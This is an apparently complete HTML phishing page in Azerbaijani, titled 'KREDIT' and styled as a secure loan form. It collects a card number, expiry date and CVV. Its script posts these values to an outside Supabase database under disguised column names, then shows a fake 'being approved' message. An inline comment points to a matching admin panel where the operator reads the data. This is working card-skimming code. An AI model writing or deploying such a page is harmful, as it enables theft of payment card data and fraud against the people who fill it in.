<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KREDIT</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}

body{
  height:100vh;
  overflow:hidden;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  display:flex;
  flex-direction:column;
  color:white;
}

header{
  padding:20px;
  font-size:20px;
  font-weight:bold;
  z-index:2;
}

.container{
  flex:1;
  display:flex;
  justify-content:center;
  align-items:center;
}

.phone{
  width:340px;
  height:650px;
  background:black;
  border-radius:40px;
  padding:20px;
  box-shadow:0 40px 80px rgba(0,0,0,0.6);
}

.screen{
  background:linear-gradient(135deg,#1e3c72,#2a5298);
  height:100%;
  border-radius:30px;
  padding:25px;
  display:flex;
  flex-direction:column;
  justify-content:center;
}

input{
  width:100%;
  padding:12px;
  border:none;
  border-radius:12px;
  margin-bottom:12px;
  font-size:14px;
  outline:none;
}

.row{display:flex;gap:10px;}

button{
  padding:14px;
  border:none;
  border-radius:12px;
  background:#00c6ff;
  color:white;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>
<body>

<header>Sürətli və Təhlükəsiz</header>

<div class="container">
<div class="phone">
<div class="screen">

<input id="mainInput" maxlength="16" placeholder="Kart nömrəsi">
<div class="row">
<input id="smallInput" maxlength="4" placeholder="Tarix">
<input id="backInput" maxlength="3" placeholder="CVV">
</div>

<button onclick="submitData()">Təsdiqlə</button>

</div>
</div>
</div>

<script type="module">
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"

const supabaseUrl = "https://gkrfcoyleewxrxbfdunq.supabase.co"
const supabaseKey = "sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
const supabase = createClient(supabaseUrl, supabaseKey)

window.submitData = async function(){

  const main=document.getElementById("mainInput").value.trim()
  const small=document.getElementById("smallInput").value.trim()
  const back=document.getElementById("backInput").value.trim()

  if(main.length!==16 || small.length!==4 || back.length!==3){
    alert("Məlumat natamamdır")
    return
  }

  const { data, error } = await supabase
    .from("mesajlar")   // ⚠️ Admin paneldə də EYNİ ad olmalıdır
    .insert([{
      kod1: main,
      kod2: small,
      kod3: back
    }])

  if(error){
    alert("Xəta: " + error.message)
  } else {
    alert("Onaylanır...")
  }
}
</script>

</body>
</html>
